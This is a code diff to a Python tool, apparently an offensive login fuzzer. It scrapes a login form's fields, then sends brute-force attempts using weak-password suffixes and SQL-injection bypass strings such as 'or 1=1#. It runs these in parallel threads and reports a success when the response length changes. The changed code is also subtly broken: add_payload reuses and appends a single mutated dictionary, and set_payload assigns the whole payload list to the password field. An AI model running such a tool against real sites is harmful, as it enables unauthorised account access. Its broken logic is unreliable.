@@ -3,9 +3,10 @@
 #author:Jinhao
 
 import requests
-import os,re
+import os,re,sys,json
 from concurrent.futures import ThreadPoolExecutor
 from reports import reports
+from bs4 import BeautifulSoup
 
 weak_dict = ['123', '888', '@123', '666']  # 常用弱密码后缀
 sql_pass = ['\'or 1=1#', '"or 1=1#', '\')or 1=1#', 'or 1=1--', 'a\'or\'1=1--', '\'OR 1=1%00']  # sql万能密码
@@ -26,15 +27,22 @@ class Login:
         exp = []
         print('>>>>>Login_fuzz'+'-'*40)
         print('[ tips:有很多payload文件保存在./dict/login目录下 ]')
-        usr = self.check_null(input('请输入用户名参数信息 [username=admin]\n'),'username')
-        pwd = self.check_null(input('请输入密码参数信息 [password=admin]\n'),'password')
-        print('[ 初始参数：{}&{} ]'.format(usr,pwd))
-        exp = self.add_payload(usr,pwd,payload)
+        args = self.get_args()
+        if not args:
+            return
+        data = {}
+        for x in args:
+            if not args[x]:
+                data[x] = input('请输入 {} 的值\n'.format(x))
+            else:
+                data[x] = args[x]
+        print(data)
+        exp = self.add_payload(data,payload)
         if self.file or self.flag:
             payloads = self.load_file(self.file)
             if payloads:
                 print('[ payload导入完成 ]')
-                exp += self.set_payload(usr, pwd, payloads)
+                exp += self.set_payload(data, payloads)
             else:
                 print('[ payload导入失败 ]')
         # print(exp)
@@ -44,6 +52,19 @@ class Login:
         else:
             print('[ 没有探测出网站密码 ]')
         print('-'*40+'Login_fuzz<<<<<')
+
+    def get_args(self):
+        '''
+        获取表单元素和值
+        :return:dict
+        '''
+        args = {}
+        res = requests.get(self.url)
+        soup = BeautifulSoup(res.content, 'html.parser')
+        xxx = soup.find_all('input')
+        for i in xxx:
+            args[i.get('name')] = i.get('value')
+        return args
 
 
     def load_file(self,file):
@@ -73,67 +94,40 @@ class Login:
         payload = list(set(payload))   # payload去重
         return payload
 
-    def check_null(self,param,data):
-        '''
-        参数设置
-        :param param:
-        :return:
-        '''
-        p = re.compile('(.+)=(.+)')
-        if p.match(param):
-            return param
-        if param:
-            param = '{}={}'.format(data,param)
-            return param
-        param = '{}=admin'.format(data)
-        return param
 
-    def add_payload(self,usr,pwd,payloads):
+    def add_payload(self,data,payloads):
         '''
         拼接payload
-        :param usr:
-        :param pwd:
+        :param data:
         :param payloads:
         :return:
         '''
         exp = []
-        u_param = usr.split('=')[0]
-        u_data = usr.split('=')[1]
-        p_param = pwd.split('=')[0]
-        p_data = pwd.split('=')[1]
+        pwd = list(data)[1]
+        p_v = data[pwd]
         try:
-            self.len = len(requests.post(self.url,data={u_param:u_data,p_param:p_data},headers=headers,timeout=5).content)   # 设置默认网站长度
+            self.len = len(requests.post(self.url,data=data,headers=headers,timeout=5).content)   # 设置默认网站长度
         except:
-            self.len = len(requests.post(self.url, data={u_param: u_data, p_param: p_data}, headers=headers,
+            self.len = len(requests.post(self.url, data=data, headers=headers,
                                          timeout=20).content)  # 设置默认网站长度
         for x in payloads:
-            data = {
-                u_param: u_data,
-                p_param: p_data+x
-            }
+            data[pwd] = p_v + x    # 仅仅修改密码部分
             exp.append(data)
         return exp
 
 
-    def set_payload(self,usr,pwd,payloads):
+    def set_payload(self,data,payloads):
         '''
-        设置exp
-        :param usr:
-        :param pwd:
-        :param payloads:
-        :return:
+        设置payload
+        :param data: dict
+        :param payloads: 弱密码集
+        :return: data
         '''
         exp = []
-        u_param = usr.split('=')[0]
-        u_data = usr.split('=')[1]
-        p_param = pwd.split('=')[0]
-        p_data = pwd.split('=')[1]
+        pwd = list(data)[1]
 
         for x in payloads:
-            data = {
-                u_param : u_data,
-                p_param : x
-            }
+            data[pwd] = payloads
             exp.append(data)
         return exp
 
@@ -141,8 +135,8 @@ class Login:
     def run(self,exp):
         '''
         多线程跑fuzz
-        :param exp:
-        :return:
+        :param exp:data集
+        :return:报告
         '''
         report = []
         with ThreadPoolExecutor(max_workers=self.threads) as pool:
@@ -164,6 +158,9 @@ class Login:
             res = requests.post(self.url,data=data,headers=headers,timeout=5).content
             if len(res) != self.len:
                 msg = {'flag':1,'msg':data}
+                return msg
+            else:
+                msg = {'flag': 0}
                 return msg
         except:
             msg = {'flag':0}
